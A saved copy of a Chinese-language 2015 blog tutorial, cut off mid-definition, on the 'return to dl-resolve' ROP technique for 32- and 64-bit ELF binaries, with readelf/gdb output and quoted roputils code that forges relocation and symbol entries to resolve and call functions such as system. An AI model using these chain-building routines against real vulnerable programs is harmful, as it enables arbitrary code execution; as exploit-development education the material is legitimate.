<!DOCTYPE html>
<!-- saved from url=(0062)http://rk700.github.io/article/2015/08/09/return-to-dl-resolve -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>ROP之return to dl-resolve</title>
    
    <meta name="author" content="rk700">

    <!-- Enable responsive viewport -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Bootstrap styles -->
    <link href="./ROP之return to dl-resolve_files/bootstrap.min.css" rel="stylesheet">
    <!-- Optional theme -->
    <link href="./ROP之return to dl-resolve_files/bootstrap-theme.min.css" rel="stylesheet">
    <!-- Sticky Footer -->
    <!-- <link href="/assets/themes/bootstrap-3/bootstrap/css/bs-sticky-footer.css" rel="stylesheet"> -->
    
    <!-- Custom styles -->
    <link href="./ROP之return to dl-resolve_files/style.css" rel="stylesheet" type="text/css" media="all">

    <link href="./ROP之return to dl-resolve_files/pygments.css" rel="stylesheet">
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <!-- Fav and touch icons -->
    <!-- Update these with your own images
      <link rel="shortcut icon" href="images/favicon.ico">
      <link rel="apple-touch-icon" href="images/apple-touch-icon.png">
      <link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
      <link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
    -->

    <!-- atom & rss feed -->
    <link href="http://rk700.github.io/atom.xml" type="application/atom+xml" rel="alternate" title="Sitewide ATOM Feed">
    <link href="http://rk700.github.io/rss.xml" type="application/rss+xml" rel="alternate" title="Sitewide RSS Feed">

  <script type="text/javascript" async="" src="http://rk700.disqus.com/embed.js"></script></head>

  <body>
    <div id="wrap">
      <nav class="navbar navbar-default" role="navigation">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header">
          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#jb-navbar-collapse">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="http://rk700.github.io/">记事本</a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <div class="collapse navbar-collapse" id="jb-navbar-collapse">
          <ul class="nav navbar-nav">
            
            
            


  
    
      
      	
      	<li><a href="http://rk700.github.io/archive">Archive</a></li>
      	
      
    
  
    
      
    
  
    
      
      	
      	<li><a href="http://rk700.github.io/categories">Categories</a></li>
      	
      
    
  
    
      
    
  
    
      
      	
      	<li><a href="http://rk700.github.io/pages">Pages</a></li>
      	
      
    
  
    
      
    
  
    
      
    
  
    
      
      	
      	<li><a href="http://rk700.github.io/tags">Tags</a></li>
      	
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  



          </ul>
          <form class="navbar-form navbar-right" role="search">
            <div class="form-group">
              <input type="text" class="form-control" placeholder="Search">
            </div>
            <button type="submit" class="btn btn-default">Submit</button>
          </form>
        </div><!-- /.navbar-collapse -->
      </nav>

      <div class="container">
        

<div class="page-header">
  <h1>ROP之return to dl-resolve </h1>
</div>

<div class="row post-full">
  <div class="col-xs-12">
    <div class="date">
      <span>09 August 2015</span>
    </div>
    <div class="content">
      <p>我们都知道，ELF在执行时，许多函数的地址是lazy binding的，即在第一次调用时才会解析其地址并填充至<code class="highlighter-rouge">.got.plt</code>。对于具体这一解析过程是如何完成的，之前并不怎么了解，只知道是在<code class="highlighter-rouge">.plt</code>中完成。其实之前Tiger有告诉我有一个名为<a href="https://github.com/inaz2/roputils">roputils</a>的工具，利用的就是构造所需信息，直接解析得到<code class="highlighter-rouge">system</code>的地址进而ROP。但直到最近才去研究其代码，搞明白这一技术，即return to dl-resolve，具体是怎么回事。</p>

<p>关于这一技术，在<a href="http://phrack.org/issues/58/4.html#article">phrack的某一期</a>有具体介绍。在此，我们首先以32位为例，阐述其基本原理；之后则会分析64位环境下这一技术的一些注意点。</p>

<h2 id="return-to-dl-resolve">32位环境下return to dl-resolve</h2>

<p>ELF文件的<code class="highlighter-rouge">.dynamic</code> section里包含了<code class="highlighter-rouge">ld.so</code>用于运行时解析函数地址的信息。其内容示例如下:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">$ </span>readelf -d bof32

Dynamic section at offset 0x614 contains 24 entries:
Tag        Type                         Name/Value
0x00000001 <span class="o">(</span>NEEDED<span class="o">)</span>                     Shared library: <span class="o">[</span>libc.so.6]
0x0000000c <span class="o">(</span>INIT<span class="o">)</span>                       0x80482b0
0x0000000d <span class="o">(</span>FINI<span class="o">)</span>                       0x80484f4
0x00000019 <span class="o">(</span>INIT_ARRAY<span class="o">)</span>                 0x8049608
0x0000001b <span class="o">(</span>INIT_ARRAYSZ<span class="o">)</span>               4 <span class="o">(</span>bytes<span class="o">)</span>
0x0000001a <span class="o">(</span>FINI_ARRAY<span class="o">)</span>                 0x804960c
0x0000001c <span class="o">(</span>FINI_ARRAYSZ<span class="o">)</span>               4 <span class="o">(</span>bytes<span class="o">)</span>
0x6ffffef5 <span class="o">(</span>GNU_HASH<span class="o">)</span>                   0x804818c
0x00000005 <span class="o">(</span>STRTAB<span class="o">)</span>                     0x804820c
0x00000006 <span class="o">(</span>SYMTAB<span class="o">)</span>                     0x80481ac
0x0000000a <span class="o">(</span>STRSZ<span class="o">)</span>                      80 <span class="o">(</span>bytes<span class="o">)</span> 0x0000000b <span class="o">(</span>SYMENT<span class="o">)</span>                     16 <span class="o">(</span>bytes<span class="o">)</span>
0x00000015 <span class="o">(</span>DEBUG<span class="o">)</span>                      0x0
0x00000003 <span class="o">(</span>PLTGOT<span class="o">)</span>                     0x8049700
0x00000002 <span class="o">(</span>PLTRELSZ<span class="o">)</span>                   32 <span class="o">(</span>bytes<span class="o">)</span>
0x00000014 <span class="o">(</span>PLTREL<span class="o">)</span>                     REL
0x00000017 <span class="o">(</span>JMPREL<span class="o">)</span>                     0x8048290
0x00000011 <span class="o">(</span>REL<span class="o">)</span>                        0x8048288
0x00000012 <span class="o">(</span>RELSZ<span class="o">)</span>                      8 <span class="o">(</span>bytes<span class="o">)</span>
0x00000013 <span class="o">(</span>RELENT<span class="o">)</span>                     8 <span class="o">(</span>bytes<span class="o">)</span>
0x6ffffffe <span class="o">(</span>VERNEED<span class="o">)</span>                    0x8048268
0x6fffffff <span class="o">(</span>VERNEEDNUM<span class="o">)</span>                 1
0x6ffffff0 <span class="o">(</span>VERSYM<span class="o">)</span>                     0x804825c
0x00000000 <span class="o">(</span>NULL<span class="o">)</span>                       0x0</code></pre></figure>

<p>其中的<code class="highlighter-rouge">JMPREL</code> segment，对应于<code class="highlighter-rouge">.rel.plt</code> section，是用来保存运行时重定位表的。它与<code class="highlighter-rouge">.rel.dyn</code>类似，只不过<code class="highlighter-rouge">.rel.plt</code>是用于函数重定位，<code class="highlighter-rouge">.rel.dyn</code>是用于变量重定位。具体地，其内容如下:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">$ </span>readelf -r bof32

Relocation section <span class="s1">'.rel.dyn'</span> at offset 0x288 contains 1 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
080496fc  00000206 R_386_GLOB_DAT    00000000   __gmon_start__

Relocation section <span class="s1">'.rel.plt'</span> at offset 0x290 contains 4 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804970c  00000107 R_386_JUMP_SLOT   00000000   <span class="nb">read
</span>08049710  00000207 R_386_JUMP_SLOT   00000000   __gmon_start__
08049714  00000307 R_386_JUMP_SLOT   00000000   __libc_start_main
08049718  00000407 R_386_JUMP_SLOT   00000000   write</code></pre></figure>

<p>可以看到，<code class="highlighter-rouge">.rel.plt</code>里包含4个条目。事实上，之前<code class="highlighter-rouge">.dynamic</code> section中的<code class="highlighter-rouge">PLTRELSZ</code>即为<code class="highlighter-rouge">.rel.plt</code>的总大小，32 bytes；<code class="highlighter-rouge">PLTREL</code>则指明这些条目的类型为<code class="highlighter-rouge">REL</code>；<code class="highlighter-rouge">RELENT</code>指明了每个<code class="highlighter-rouge">REL</code>类型条目的大小，8 bytes。于是<code class="highlighter-rouge">32/8=4</code>即为条目个数。</p>

<p>这些条目的类型是<code class="highlighter-rouge">Elf32_Rel</code>，其定义如下</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">typedef</span> <span class="kt">uint32_t</span> <span class="n">Elf32_Addr</span><span class="p">;</span>
<span class="k">typedef</span> <span class="kt">uint32_t</span> <span class="n">Elf32_Word</span><span class="p">;</span>
<span class="k">typedef</span> <span class="k">struct</span>
<span class="p">{</span>
  <span class="n">Elf32_Addr</span>    <span class="n">r_offset</span><span class="p">;</span>               <span class="cm">/* Address */</span>
  <span class="n">Elf32_Word</span>    <span class="n">r_info</span><span class="p">;</span>                 <span class="cm">/* Relocation type and symbol index */</span>
<span class="p">}</span> <span class="n">Elf32_Rel</span><span class="p">;</span>
<span class="cp">#define ELF32_R_SYM(val)                ((val) &gt;&gt; 8)
#define ELF32_R_TYPE(val)               ((val) &amp; 0xff)</span></code></pre></figure>

<p>我们以<code class="highlighter-rouge">.rel.plt</code>第一条，即<code class="highlighter-rouge">read</code>的条目为例，对比调试器显示的结果：</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">gdb-peda$ </span>x/2x 0x8048290
0x8048290:      0x0804970c      0x00000107</code></pre></figure>

<p>显示的结果与之前<code class="highlighter-rouge">$ readelf -r</code>的结果是相符的。具体地，<code class="highlighter-rouge">r_offset</code>即为该函数在<code class="highlighter-rouge">.got.plt</code>中的地址:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">gdb-peda$ </span>x/3i <span class="nb">read
   </span>0x80482f0 &lt;<span class="nb">read</span>@plt&gt;:        jmp    DWORD PTR ds:0x804970c
   0x80482f6 &lt;<span class="nb">read</span>@plt+6&gt;:      push   0x0
   0x80482fb &lt;<span class="nb">read</span>@plt+11&gt;:     jmp    0x80482e0</code></pre></figure>

<p>而<code class="highlighter-rouge">r_info</code>则保存的是其类型和符号序号。根据宏的定义，可知对于此条目，其类型为<code class="highlighter-rouge">ELF32_R_TYPE(r_info)=7</code>，对应于<code class="highlighter-rouge">R_386_JUMP_SLOT</code>；其symbol index则为<code class="highlighter-rouge">RLF32_R_SYM(r_info)=1</code>。</p>

<p>注意到之前<code class="highlighter-rouge">$ readelf -r</code>所得到的结果中，包含有<code class="highlighter-rouge">Sym.Value</code>和<code class="highlighter-rouge">Sym. Name</code>信息。而这些信息就是通过symbol index找到的。具体地，<code class="highlighter-rouge">.dynamic</code> section中的<code class="highlighter-rouge">SYMTAB</code>，即<code class="highlighter-rouge">.dynsym</code> section，保存的便是相关的符号信息。每一条symbol信息的大小在<code class="highlighter-rouge">SYMENT</code>中体现，为16 bytes。通过<code class="highlighter-rouge">$ readelf -s</code>来查看其内容如下：</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">$ </span>readelf -s bof32

Symbol table <span class="s1">'.dynsym'</span> contains 6 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND
     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND <span class="nb">read</span>@GLIBC_2.0 <span class="o">(</span>2<span class="o">)</span>
     2: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
     3: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 <span class="o">(</span>2<span class="o">)</span>
     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND write@GLIBC_2.0 <span class="o">(</span>2<span class="o">)</span>
     5: 0804850c     4 OBJECT  GLOBAL DEFAULT   15 _IO_stdin_used

Symbol table <span class="s1">'.symtab'</span> contains 74 entries:
...</code></pre></figure>

<p>(注意我们这里只看<code class="highlighter-rouge">.dynsym</code>，因为它是运行时所需的。诸如export/import的符号信息全在这里。而<code class="highlighter-rouge">.symtab</code>是编译时的符号信息，这部分在<code class="highlighter-rouge">strip</code>之后会被删除掉。)</p>

<p>可以看到，之前所说的<code class="highlighter-rouge">read</code>函数的符号信息条目index确实为1。我们通过调试器来看看其实际内容：</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">gdb-peda$ </span>x/4x 0x80481ac+16
0x80481bc:      0x0000001a      0x00000000      0x00000000      0x00000012</code></pre></figure>

<p>对比符号条目的定义如下：</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">typedef</span> <span class="k">struct</span>
<span class="p">{</span>
  <span class="n">Elf32_Word</span>    <span class="n">st_name</span><span class="p">;</span>   <span class="cm">/* Symbol name (string tbl index) */</span>
  <span class="n">Elf32_Addr</span>    <span class="n">st_value</span><span class="p">;</span>  <span class="cm">/* Symbol value */</span>
  <span class="n">Elf32_Word</span>    <span class="n">st_size</span><span class="p">;</span>   <span class="cm">/* Symbol size */</span>
  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">st_info</span><span class="p">;</span>   <span class="cm">/* Symbol type and binding */</span>
  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">st_other</span><span class="p">;</span>  <span class="cm">/* Symbol visibility under glibc&gt;=2.2 */</span>
  <span class="n">Elf32_Section</span> <span class="n">st_shndx</span><span class="p">;</span>  <span class="cm">/* Section index */</span>
<span class="p">}</span> <span class="n">Elf32_Sym</span><span class="p">;</span></code></pre></figure>

<p>其结果与<code class="highlighter-rouge">$ readelf -r</code>, <code class="highlighter-rouge">$ readelf -s</code>的结果相符。具体地，<code class="highlighter-rouge">st_name</code>保存的是该符号名称在<code class="highlighter-rouge">STRTAB</code>，即<code class="highlighter-rouge">.dynstr</code>中的地址：</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">gdb-peda$ </span>x/s 0x804820c+0x1a
0x8048226:      <span class="s2">"read"</span></code></pre></figure>

<p>而对于其他项，如<code class="highlighter-rouge">st_info</code>，<code class="highlighter-rouge">st_other</code>等，我还没搞明白对应的意义。但在实际构造时，只需选择和其他相同的值应该即可。</p>

<p>OK，以上便是相关背景知识。现在我们来看看在<code class="highlighter-rouge">call read@plt</code>时具体发生了什么。</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">gdb-peda$ </span>x/3i <span class="nb">read
   </span>0x80482f0 &lt;<span class="nb">read</span>@plt&gt;:        jmp    DWORD PTR ds:0x804970c
   0x80482f6 &lt;<span class="nb">read</span>@plt+6&gt;:      push   0x0
   0x80482fb &lt;<span class="nb">read</span>@plt+11&gt;:     jmp    0x80482e0
<span class="gp">gdb-peda$ </span>x/wx 0x804970c
0x804970c &lt;<span class="nb">read</span>@got.plt&gt;:       0x080482f6
<span class="gp">gdb-peda$ </span>x/2i 0x80482e0
   0x80482e0:   push   DWORD PTR ds:0x8049704
   0x80482e6:   jmp    DWORD PTR ds:0x8049708</code></pre></figure>

<p>在第一次调用时，<code class="highlighter-rouge">jmp read@got.plt</code>会跳回<code class="highlighter-rouge">read@plt</code>，这是我们已经知道的。接下来，会将参数push到栈上并跳至<code class="highlighter-rouge">.got.plt+0x8</code>，这相当于调用以下函数：</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">_dl_runtime_resolve</span><span class="p">(</span><span class="n">link_map</span><span class="p">,</span> <span class="n">rel_offset</span><span class="p">);</span></code></pre></figure>

<p><code class="highlighter-rouge">_dl_runtime_resolve</code>则会完成具体的符号解析，填充结果，和调用的工作。具体地。根据<code class="highlighter-rouge">rel_offset</code>，找到重定位条目：</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">Elf32_Rel</span> <span class="o">*</span> <span class="n">rel_entry</span> <span class="o">=</span> <span class="n">JMPREL</span> <span class="o">+</span> <span class="n">rel_offset</span><span class="p">;</span></code></pre></figure>

<p>根据<code class="highlighter-rouge">rel_entry</code>中的符号表条目编号，得到对应的符号信息：</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">Elf32_Sym</span> <span class="o">*</span><span class="n">sym_entry</span> <span class="o">=</span> <span class="n">SYMTAB</span><span class="p">[</span><span class="n">ELF32_R_SYM</span><span class="p">(</span><span class="n">rel_entry</span><span class="o">-&gt;</span><span class="n">r_info</span><span class="p">)];</span></code></pre></figure>

<p>再找到符号信息中的符号名称：</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">char</span> <span class="o">*</span><span class="n">sym_name</span> <span class="o">=</span> <span class="n">STRTAB</span> <span class="o">+</span> <span class="n">sym_entry</span><span class="o">-&gt;</span><span class="n">st_name</span><span class="p">;</span></code></pre></figure>

<p>由此名称，搜索动态库。找到地址后，填充至<code class="highlighter-rouge">.got.plt</code>对应位置。最后调整栈，调用这一解析得到的函数。</p>

<p>于是，我们的思路是，提供一个很大的数作为<code class="highlighter-rouge">rel_offset</code>给<code class="highlighter-rouge">_dl_runtime_resolve</code>，使得找到<code class="highlighter-rouge">rel_entry</code>落在我们可控制的区域内。同理，构造伪条目，使得所对应的符号信息、符号的名称，均落在我们可控的区域内，那么就可以解析我们所需的函数地址并调用了。值得注意的是，在解析过程中，还会对<code class="highlighter-rouge">ELF32_R_TYPE(rel_entry-&gt;r_info)</code>等进行检查。但这些数据我们只需仿照正常的来构造即可，重点是对应的伪条目的index应计算正确。</p>

<p>作为实例，我们来看看roputils里是如何构造伪条目的。首先是函数<code class="highlighter-rouge">dl_resolve_data</code>。其定义如下：</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python">    <span class="k">def</span> <span class="nf">dl_resolve_data</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">base</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
        <span class="n">jmprel</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">dynamic</span><span class="p">(</span><span class="s">'JMPREL'</span><span class="p">)</span>
        <span class="n">relent</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">dynamic</span><span class="p">(</span><span class="s">'RELENT'</span><span class="p">)</span>
        <span class="n">symtab</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">dynamic</span><span class="p">(</span><span class="s">'SYMTAB'</span><span class="p">)</span>
        <span class="n">syment</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">dynamic</span><span class="p">(</span><span class="s">'SYMENT'</span><span class="p">)</span>
        <span class="n">strtab</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">dynamic</span><span class="p">(</span><span class="s">'STRTAB'</span><span class="p">)</span>

        <span class="n">addr_reloc</span><span class="p">,</span> <span class="n">padlen_reloc</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">align</span><span class="p">(</span><span class="n">base</span><span class="p">,</span> <span class="n">jmprel</span><span class="p">,</span> <span class="n">relent</span><span class="p">)</span>
        <span class="n">addr_sym</span><span class="p">,</span> <span class="n">padlen_sym</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">align</span><span class="p">(</span><span class="n">addr_reloc</span><span class="o">+</span><span class="n">relent</span><span class="p">,</span> <span class="n">symtab</span><span class="p">,</span> <span class="n">syment</span><span class="p">)</span>
        <span class="n">addr_symstr</span> <span class="o">=</span> <span class="n">addr_sym</span> <span class="o">+</span> <span class="n">syment</span>

        <span class="n">r_info</span> <span class="o">=</span> <span class="p">(((</span><span class="n">addr_sym</span> <span class="o">-</span> <span class="n">symtab</span><span class="p">)</span> <span class="o">/</span> <span class="n">syment</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x7</span>
        <span class="n">st_name</span> <span class="o">=</span> <span class="n">addr_symstr</span> <span class="o">-</span> <span class="n">strtab</span>

        <span class="n">buf</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">fill</span><span class="p">(</span><span class="n">padlen_reloc</span><span class="p">)</span>
        <span class="n">buf</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">'&lt;II'</span><span class="p">,</span> <span class="n">base</span><span class="p">,</span> <span class="n">r_info</span><span class="p">)</span>                      <span class="c"># Elf32_Rel</span>
        <span class="n">buf</span> <span class="o">+=</span> <span class="bp">self</span><span class="o">.</span><span class="n">fill</span><span class="p">(</span><span class="n">padlen_sym</span><span class="p">)</span>
        <span class="n">buf</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">'&lt;IIII'</span><span class="p">,</span> <span class="n">st_name</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">)</span>             <span class="c"># Elf32_Sym</span>
        <span class="n">buf</span> <span class="o">+=</span> <span class="bp">self</span><span class="o">.</span><span class="n">string</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">buf</span></code></pre></figure>

<p>从<code class="highlighter-rouge">base</code>开始便是用户可控的区域，也是用来构造伪<code class="highlighter-rouge">Elf32_Rel</code>, 伪<code class="highlighter-rouge">Elf32_Sym</code>，和符号名称的地方。具体的存放地址，还是根据数组条目的大小进行了对齐。而需要检查的地方，则全部硬编码了，只需计算这些伪条目对应在数组中的index填充即可。</p>

<p>其次便是函数<code class="highlighter-rouge">dl_resolve_call</code>了。其定义如下：</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python">    <span class="k">def</span> <span class="nf">dl_resolve_call</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">base</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">):</span>
        <span class="n">jmprel</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">dynamic</span><span class="p">(</span><span class="s">'JMPREL'</span><span class="p">)</span>
        <span class="n">relent</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">dynamic</span><span class="p">(</span><span class="s">'RELENT'</span><span class="p">)</span>

        <span class="n">addr_reloc</span><span class="p">,</span> <span class="n">padlen_reloc</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">align</span><span class="p">(</span><span class="n">base</span><span class="p">,</span> <span class="n">jmprel</span><span class="p">,</span> <span class="n">relent</span><span class="p">)</span>
        <span class="n">reloc_offset</span> <span class="o">=</span> <span class="n">addr_reloc</span> <span class="o">-</span> <span class="n">jmprel</span>

        <span class="n">buf</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">plt</span><span class="p">())</span>
        <span class="n">buf</span> <span class="o">+=</span> <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="p">(</span><span class="n">reloc_offset</span><span class="p">)</span>
        <span class="n">buf</span> <span class="o">+=</span> <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">gadget</span><span class="p">(</span><span class="s">'pop'</span><span class="p">,</span> <span class="n">n</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">)))</span>
        <span class="n">buf</span> <span class="o">+=</span> <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">buf</span></code></pre></figure>

<p>可以看到，这里将所调用的函数的参数及返回的gadget放在栈上，再往上便是构造的伪<code class="highlighter-rouge">Elf32_Rel</code>条目的offset，最后则是<code class="highlighter-rouge">.plt</code>起始处的地址，在那里会完成将<code class="highlighter-rouge">link_map</code>放至栈上及调用<code class="highlighter-rouge">_dl_runtime_resolve</code>。</p>

<h2 id="return-to-dl-resolve-1">64位环境下return to dl-resolve</h2>

<p>相比32位，其实基本原理还是相同的。只是由于位数增加，一些结构体发生变化；此外，函数参数也变成由寄存器传递而非栈传递。</p>

<p>具体地，我们看64位relocation entry的定义。首先通过<code class="highlighter-rouge">$ readelf -d</code>可知，现在的类型为<code class="highlighter-rouge">RELA</code>，大小<code class="highlighter-rouge">RELAENT</code>为24 bytes：</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">$ </span>readelf -d bof64

Dynamic section at offset 0x7b0 contains 24 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 <span class="o">(</span>NEEDED<span class="o">)</span>             Shared library: <span class="o">[</span>libc.so.6]
 0x000000000000000c <span class="o">(</span>INIT<span class="o">)</span>               0x4003e0
 0x000000000000000d <span class="o">(</span>FINI<span class="o">)</span>               0x400634
 0x0000000000000019 <span class="o">(</span>INIT_ARRAY<span class="o">)</span>         0x600798
 0x000000000000001b <span class="o">(</span>INIT_ARRAYSZ<span class="o">)</span>       8 <span class="o">(</span>bytes<span class="o">)</span>
 0x000000000000001a <span class="o">(</span>FINI_ARRAY<span class="o">)</span>         0x6007a0
 0x000000000000001c <span class="o">(</span>FINI_ARRAYSZ<span class="o">)</span>       8 <span class="o">(</span>bytes<span class="o">)</span>
 0x000000006ffffef5 <span class="o">(</span>GNU_HASH<span class="o">)</span>           0x400260
 0x0000000000000005 <span class="o">(</span>STRTAB<span class="o">)</span>             0x4002f8
 0x0000000000000006 <span class="o">(</span>SYMTAB<span class="o">)</span>             0x400280
 0x000000000000000a <span class="o">(</span>STRSZ<span class="o">)</span>              67 <span class="o">(</span>bytes<span class="o">)</span>
 0x000000000000000b <span class="o">(</span>SYMENT<span class="o">)</span>             24 <span class="o">(</span>bytes<span class="o">)</span>
 0x0000000000000015 <span class="o">(</span>DEBUG<span class="o">)</span>              0x0
 0x0000000000000003 <span class="o">(</span>PLTGOT<span class="o">)</span>             0x600988
 0x0000000000000002 <span class="o">(</span>PLTRELSZ<span class="o">)</span>           96 <span class="o">(</span>bytes<span class="o">)</span>
 0x0000000000000014 <span class="o">(</span>PLTREL<span class="o">)</span>             RELA
 0x0000000000000017 <span class="o">(</span>JMPREL<span class="o">)</span>             0x400380
 0x0000000000000007 <span class="o">(</span>RELA<span class="o">)</span>               0x400368
 0x0000000000000008 <span class="o">(</span>RELASZ<span class="o">)</span>             24 <span class="o">(</span>bytes<span class="o">)</span>
 0x0000000000000009 <span class="o">(</span>RELAENT<span class="o">)</span>            24 <span class="o">(</span>bytes<span class="o">)</span>
 0x000000006ffffffe <span class="o">(</span>VERNEED<span class="o">)</span>            0x400348
 0x000000006fffffff <span class="o">(</span>VERNEEDNUM<span class="o">)</span>         1
 0x000000006ffffff0 <span class="o">(</span>VERSYM<span class="o">)</span>             0x40033c
 0x0000000000000000 <span class="o">(</span>NULL<span class="o">)</span>               0x0</code></pre></figure>

<p>其定义如下：</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">typedef</span> <span class="n">__u16</span>   <span class="n">Elf64_Half</span><span class="p">;</span>
<span class="k">typedef</span> <span class="n">__u32</span>   <span class="n">Elf64_Word</span><span class="p">;</span>
<span class="k">typedef</span> <span class="n">__u64</span>   <span class="n">Elf64_Addr</span><span class="p">;</span>
<span class="k">typedef</span> <span class="n">__u64</span>   <span class="n">Elf64_Xword</span><span class="p">;</span>
<span class="k">typedef</span> <span class="n">__s64</span>   <span class="n">Elf64_Sxword</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="n">elf64_rela</span> <span class="p">{</span>
  <span class="n">Elf64_Addr</span> <span class="n">r_offset</span><span class="p">;</span>  <span class="cm">/* Location at which to apply the action */</span>
  <span class="n">Elf64_Xword</span> <span class="n">r_info</span><span class="p">;</span>   <span class="cm">/* index and type of relocation */</span>
  <span class="n">Elf64_Sxword</span> <span class="n">r_addend</span><span class="p">;</span>    <span class="cm">/* Constant addend used to compute value */</span>
<span class="p">}</span> <span class="n">Elf64_Rela</span><span class="p">;</span>
<span class="cp">#define ELF64_R_SYM(i)          ((i) &gt;&gt; 32)
#define ELF64_R_TYPE(i)         ((i) &amp; 0xffffffff)</span></code></pre></figure>

<p>相应地，在roputils中，64位下构造伪Elf64_Rela的代码如下：</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">...</span>
        <span class="n">r_info</span> <span class="o">=</span> <span class="p">(((</span><span class="n">addr_sym</span> <span class="o">-</span> <span class="n">symtab</span><span class="p">)</span> <span class="o">/</span> <span class="n">syment</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x7</span>
<span class="o">...</span>
        <span class="n">buf</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">'&lt;QQQ'</span><span class="p">,</span> <span class="n">base</span><span class="p">,</span> <span class="n">r_info</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>                  <span class="c"># Elf64_Rela</span></code></pre></figure>

<p><code class="highlighter-rouge">SYMTAB</code>中的条目定义则变化如下：</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">elf64_sym</span> <span class="p">{</span>
  <span class="n">Elf64_Word</span> <span class="n">st_name</span><span class="p">;</span>       <span class="cm">/* Symbol name, index in string tbl */</span>
